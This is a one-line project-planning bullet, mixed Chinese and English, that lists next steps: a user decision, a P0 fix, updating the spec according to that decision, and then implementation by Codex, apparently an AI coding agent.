- 下一步：用户 decision → P0 修复 → 按决策回写 spec → Codex 实施
